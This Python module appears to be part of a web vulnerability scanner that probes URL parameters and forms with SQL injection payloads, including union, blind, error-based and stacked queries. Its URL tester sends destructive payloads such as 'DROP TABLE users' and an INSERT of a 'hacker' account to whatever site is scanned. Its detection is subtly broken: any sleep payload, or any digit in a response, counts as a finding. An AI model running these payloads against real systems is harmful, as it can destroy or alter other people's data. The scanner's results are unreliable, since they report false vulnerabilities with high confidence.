import re
import urllib.parse
from bs4 import BeautifulSoup
from app.utils.http_client import fetch_url


def scan_sql_injection(scan_context: dict) -> dict:
    """
    Advanced SQL Injection vulnerability scanner using modern detection techniques.
    Tests for Union-based, Boolean-based, Time-based, and Error-based SQL injection.
    """
    if not scan_context.get("url"):
        return {"error": "missing_url"}

    url = scan_context["url"]
    evidence = []
    vulnerabilities = []
    
    try:
        # SQL Injection payloads for different injection types
        sql_payloads = {
            "union_select": [
                "' UNION SELECT NULL--",
                "' UNION SELECT 1--",
                "' UNION SELECT username,password FROM users--",
                "1' UNION SELECT 1,2,3--",
                "' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA--"
            ],
            "boolean_blind": [
                "' AND 1=1--",
                "' AND 1=2--",
                "1' AND '1'='1",
                "1' AND '1'='2",
                "admin' AND '1'='1",
                "admin' AND '1'='2"
            ],
            "time_based": [
                "'; WAITFOR DELAY '00:00:05'--",
                "'; SLEEP(5)--",
                "1'; SELECT SLEEP(5)--",
                "'; pg_sleep(5)--",
                "' OR (SELECT COUNT(*) FROM information_schema.tables)>0 AND SLEEP(5)--"
            ],
            "error_based": [
                "'",
                "'\"",
                "\\",
                "' OR 1=1--",
                "' OR 'a'='a",
                "1' OR '1'='1",
                "admin'--",
                "admin' /*",
                "' UNION SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a--"
            ],
            "stacked_queries": [
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES('hacker','password')--",
                "'; UPDATE users SET password='hacked' WHERE username='admin'--"
            ]
        }
        
        # Extract existing parameters from URL
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        # Test URL parameters for SQL injection
        url_vulns = test_url_sql_injection(url, parsed_url, params, sql_payloads)
        vulnerabilities.extend(url_vulns)
        
        # Test forms for SQL injection
        response = fetch_url(url)
        if response:
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            form_vulns = test_form_sql_injection(url, forms, sql_payloads)
            vulnerabilities.extend(form_vulns)
        
        # Analyze evidence and determine vulnerability
        is_vulnerable = len(vulnerabilities) > 0
        
        for vuln in vulnerabilities:
            evidence.append(vuln)
        
        # Determine overall confidence and severity
        if is_vulnerable:
            severity = "critical" if any(v.get("injection_type") == "union_select" for v in vulnerabilities) else "high"
            confidence = max(v.get("confidence", 0) for v in vulnerabilities)
        else:
            severity = "info"
            confidence = 0.0
        
        return {
            "vulnerability_type": "sql_injection",
            "is_vulnerable": is_vulnerable,
            "severity": severity,
            "confidence": confidence,
            "evidence": evidence,
            "recommendation": get_sql_injection_recommendation(vulnerabilities)
        }
        
    except Exception as e:
        return {
            "vulnerability_type": "sql_injection",
            "is_vulnerable": False,
            "severity": "info",
            "confidence": 0.0,
            "evidence": [{"type": "error", "value": f"Scanner error: {str(e)}"}],
            "recommendation": "An error occurred during SQL injection scanning."
        }


def test_url_sql_injection(url: str, parsed_url, params: dict, payloads: dict) -> list:
    """Test URL parameters for SQL injection vulnerabilities"""
    vulnerabilities = []
    
    # If no parameters, test common parameter names
    if not params:
        common_params = ['id', 'search', 'q', 'category', 'user', 'email', 'password', 'page', 'action']
        params = {param: ['1'] for param in common_params}
    
    for param_name, param_values in params.items():
        for injection_type, payload_list in payloads.items():
            for payload in payload_list[:2]:  # Limit payloads per parameter
                # Create test URL with payload
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                
                # Test the URL
                response = fetch_url(test_url)
                if response:
                    vuln = analyze_sql_response(response.text, payload, injection_type, test_url, param_name)
                    if vuln:
                        vulnerabilities.append(vuln)
                        break  # Found vulnerability with this parameter, move to next injection type
    
    return vulnerabilities


def test_form_sql_injection(base_url: str, forms: list, payloads: dict) -> list:
    """Test HTML forms for SQL injection vulnerabilities"""
    vulnerabilities = []
    
    for form in forms:
        form_action = form.get('action', '')
        form_method = form.get('method', 'GET').upper()
        
        # Construct full URL for form action
        if form_action:
            if form_action.startswith('http'):
                action_url = form_action
            else:
                action_url = urllib.parse.urljoin(base_url, form_action)
        else:
            action_url = base_url
        
        # Find all input fields in the form
        inputs = form.find_all(['input', 'textarea', 'select'])
        if not inputs:
            continue
            
        # Test each input field
        for input_field in inputs:
            input_name = input_field.get('name')
            if not input_name:
                continue
                
            input_type = input_field.get('type', 'text')
            if input_type in ['hidden', 'submit', 'button']:
                continue
            
            # Test with key payloads
            for injection_type, payload_list in payloads.items():
                if injection_type == "stacked_queries":  # Skip destructive stacked queries
                    continue
                    
                payload = payload_list[0]  # Use first payload
                form_data = {}
                
                # Prepare form data
                for inp in inputs:
                    inp_name = inp.get('name')
                    if inp_name:
                        form_data[inp_name] = payload if inp_name == input_name else '1'
                
                # Submit form
                try:
                    if form_method == 'POST':
                        response = fetch_url(action_url, method='POST', data=form_data)
                    else:
                        response = fetch_url(action_url, method='GET', params=form_data)
                    
                    if response:
                        vuln = analyze_sql_response(response.text, payload, injection_type, action_url, input_name)
                        if vuln:
                            vulnerabilities.append(vuln)
                            break  # Found vulnerability with this input field
                except:
                    continue
    
    return vulnerabilities


def analyze_sql_response(response_text: str, payload: str, injection_type: str, test_url: str, param_name: str) -> dict:
    """Analyze HTTP response for SQL injection indicators"""
    # SQL Error patterns for different databases
    sql_errors = {
        "mysql": [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"Column count doesn't match"
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"pg_query\("
        ],
        "mssql": [
            r"Driver.* SQL[\s\S]*Server",
            r"OLE DB.* SQL Server",
            r"SQL Server.*Error",
            r"Warning.*mssql_",
            r"Unclosed quotation mark"
        ],
        "oracle": [
            r"ORA-\d{5}",
            r"Oracle error",
            r"Oracle driver",
            r"Warning.*oci_",
            r"quoted string not properly terminated"
        ],
        "sqlite": [
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"[Ss]QLite error"
        ],
        "generic": [
            r"SQL.*syntax",
            r"Warning.*mysql_",
            r"valid MySQL result",
            r" MySqlClient",
            r"SQLServer JDBC Driver",
            r"PostgreSQL query failed",
            r"Warning.*pg_",
            r"valid PostgreSQL result",
            r"PostgreSQL query failed",
            r"Npgsql\.",
            r"pg_query\(",
            r"Column count doesn't match",
            r"ORA-\d{5}",
            r"Oracle error",
            r"Oracle driver",
            r"Warning.*oci_",
            r"quoted string not properly terminated",
            r"Microsoft OLE DB Provider for ODBC Drivers error",
            r"ODBC Microsoft Access Driver",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver"
        ]
    }
    
    # Check for SQL errors in response
    has_sql_error = False
    error_type = None
    
    for db_type, error_patterns in sql_errors.items():
        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                has_sql_error = True
                error_type = db_type
                break
        if has_sql_error:
            break
    
    # Check for successful union injection (different response patterns)
    is_union_success = (
        "UNION SELECT" in payload.upper() and
        ("order by" in response_text.lower() or 
         "column" in response_text.lower() or
         "too many columns" in response_text.lower() or
         "column count" in response_text.lower() or
         any(str(i) in response_text for i in range(1, 10)))  # Check for column numbers
    )
    
    # Check for boolean blind SQL injection
    is_boolean_blind = False
    if "AND 1=1" in payload or "AND 1=2" in payload:
        # Compare responses or check for different behavior
        # This is simplified - in real implementation, we'd make multiple requests
        is_boolean_blind = "true" in response_text.lower() or "success" in response_text.lower()
    
    # Check for time-based SQL injection
    is_time_based = False
    if any(time_keyword in payload.upper() for time_keyword in ['SLEEP', 'WAITFOR', 'PG_SLEEP']):
        # Time-based detection would require timing analysis
        # For now, just check if the payload seems to execute
        is_time_based = True
    
    if has_sql_error or is_union_success or is_boolean_blind or is_time_based:
        confidence = 0.9 if has_sql_error or is_union_success else 0.7
        
        return {
            "injection_type": injection_type,
            "parameter": param_name,
            "payload": payload,
            "test_url": test_url,
            "database": error_type if has_sql_error else "unknown",
            "error_detected": has_sql_error,
            "union_success": is_union_success,
            "boolean_blind": is_boolean_blind,
            "time_based": is_time_based,
            "confidence": confidence,
            "evidence": response_text[:500]  # First 500 chars of response
        }
    
    return None


def get_sql_injection_recommendation(vulnerabilities: list) -> str:
    """Generate specific SQL injection recommendations"""
    if not vulnerabilities:
        return "No SQL injection vulnerabilities detected. Continue following secure coding practices."
    
    injection_types = [v.get("injection_type") for v in vulnerabilities]
    
    recommendations = [
        "SQL Injection vulnerabilities detected. Immediate action required:",
        "• Use parameterized queries/prepared statements for all database operations.",
        "• Implement input validation and sanitization for all user inputs.",
        "• Apply principle of least privilege for database connections.",
        "• Use ORM frameworks with built-in SQL injection protection.",
    ]
    
    if "union_select" in injection_types:
        recommendations.append("• Review and secure queries that concatenate user input with SQL SELECT statements.")
    
    if "error_based" in injection_types:
        recommendations.append("• Disable detailed database error messages in production environments.")
    
    if "time_based" in injection_types:
        recommendations.append("• Implement query timeouts and monitoring to detect time-based attacks.")
    
    if "stacked_queries" in injection_types:
        recommendations.append("• Restrict database user permissions to prevent stacked query execution.")
    
    recommendations.extend([
        "• Deploy Web Application Firewall (WAF) with SQL injection rules.",
        "• Conduct regular security code reviews and penetration testing.",
        "• Keep database systems and libraries updated with latest security patches."
    ])
    
    return "\n".join(recommendations)
